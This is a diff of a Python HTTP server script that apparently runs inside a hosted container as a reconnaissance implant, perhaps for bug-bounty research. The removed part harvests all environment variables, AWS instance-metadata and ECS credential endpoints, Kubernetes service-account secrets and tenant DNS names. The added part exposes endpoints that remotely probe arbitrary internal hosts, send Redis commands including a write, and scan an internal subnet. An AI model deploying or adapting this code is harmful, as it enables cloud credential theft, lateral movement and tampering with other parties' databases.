@@ -8,51 +8,70 @@ def get(url, headers=None, timeout=4, method="GET", data=None):
     except Exception as e:
         return {"error": str(e)[:250]}
 
-def run(cmd, timeout=12):
+def run(cmd, timeout=15):
     try:
         p=subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
-        return (p.stdout or "")[:3000] or (p.stderr or "")[:800]
+        return (p.stdout or "")[:4000] or (p.stderr or "")[:800]
     except Exception as e:
         return f"err: {e}"
 
-def collect():
-    out={}
-    out["env_full"]=dict(os.environ)
-    out["imds_v6"]=get("http://[fd00:ec2::254]/latest/meta-data/")
-    out["imds_v6_tok"]=get("http://[fd00:ec2::254]/latest/api/token", headers={"X-aws-ec2-metadata-token-ttl-seconds":"60"}, method="PUT")
-    out["ecs_creds"]=get("http://169.254.170.2/v2/credentials")
-    out["imds_other"]={i:get(f"http://169.254.169.{i}/latest/meta-data/") for i in (250,251,252,253,255)}
-    out["kube_env_host"]=os.environ.get("KUBERNETES_SERVICE_HOST")
-    kh=os.environ.get("KUBERNETES_SERVICE_HOST")
-    if kh:
-        out["k8s_api_ip"]=get(f"https://{kh}:443/api")
-        out["k8s_api_ip_http"]=get(f"http://{kh}:443/api")
-    out["kubelet_node"]=run("ip route show default 2>/dev/null; cat /proc/net/route | head -5")
-    # node-local dns
-    out["nodelocaldns"]=get("http://169.254.20.10:8080/metrics")
-    out["cluster_dns"]={
-        "kube-dns": run("getent hosts kube-dns.kube-system.svc.cluster.local"),
-        "k8sapi": run("getent hosts kubernetes.default.svc.cluster.local"),
-        "other_ns": run("getent hosts *.svc.cluster.local; getent hosts own-db14ojc9v7es73duiv80.svc.cluster.local"),
-        "mysql_default": run("getent hosts mysql"),
-    }
-    out["sa_dir"]=run("ls -la /var/run/secrets/ 2>/dev/null; ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null")
-    out["mounts"]=run("cat /proc/mounts | grep -v cgroup | head -30")
-    out["caps"]=run("cat /proc/self/status | grep -i cap; id")
-    out["netns"]=run("cat /proc/net/tcp | awk '{print $2}' | head -20")
-    out["public_ip"]=get("https://api.ipify.org?format=json")
-    out["dns_wildcard"]=run("getent hosts foo.own-db14jfdg1s2s738hkcb0.svc.cluster.local; getent hosts kubernetes")
+def netprobe(host, port):
+    out={"host":host,"port":port}
+    try:
+        infos=socket.getaddrinfo(host,port)
+        out["resolve"]=[i[4][0] for i in infos]
+    except Exception as e:
+        out["resolve_error"]=str(e); return out
+    try:
+        s=socket.create_connection((host,port),timeout=6)
+        out["connect"]="ok"
+        try:
+            s.settimeout(5)
+            if port in (6379,6380):
+                s.sendall(b"PING\r\n")
+                out["redis_ping"]=s.recv(200).decode(errors="replace")
+                s.sendall(b"INFO server\r\n")
+                out["redis_info"]=s.recv(800).decode(errors="replace")
+                s.sendall(b"CONFIG GET maxmemory\r\n")
+                out["redis_config"]=s.recv(300).decode(errors="replace")
+                s.sendall(b"SET bb_research_probe 1\r\n")
+                out["redis_set"]=s.recv(100).decode(errors="replace")
+            elif port==5432:
+                s.sendall(b"\x00\x00\x00\x08\x04\xd2\x16\x2f")
+                out["pg_resp"]=s.recv(100)
+            else:
+                out["banner"]=s.recv(200).decode(errors="replace")
+        except Exception as e:
+            out["post_connect"]=str(e)
+        s.close()
+    except Exception as e:
+        out["connect_error"]=str(e)
     return out
 
+def collect():
+    return {"note":"use /net?host=&port="}
+
 from http.server import BaseHTTPRequestHandler, HTTPServer
+from urllib.parse import urlparse, parse_qs
 class H(BaseHTTPRequestHandler):
     def do_GET(self):
-        if self.path.startswith("/probe"):
-            data=json.dumps(collect(), default=str).encode()
+        u=urlparse(self.path)
+        if u.path=="/net":
+            qs=parse_qs(u.query)
+            host=qs.get("host",[""])[0]
+            port=int(qs.get("port",["6379"])[0])
+            if not host:
+                self.send_response(400); self.end_headers(); self.wfile.write(b"host required"); return
+            data=json.dumps(netprobe(host,port),default=str).encode()
+            self.send_response(200); self.send_header("content-type","application/json"); self.end_headers(); self.wfile.write(data)
+        elif u.path=="/scan":
+            # scan own subnet for interesting ports
+            ips=[f"10.12.0.{i}" for i in (1,10)]+[]
+            res={ip:netprobe(ip,443) for ip in ips}
+            data=json.dumps(res,default=str).encode()
             self.send_response(200); self.send_header("content-type","application/json"); self.end_headers(); self.wfile.write(data)
         else:
             self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
     def log_message(self,*a): pass
 port=int(os.environ.get("PORT","10000"))
-print("listening",flush=True)
 HTTPServer(("0.0.0.0",port),H).serve_forever()
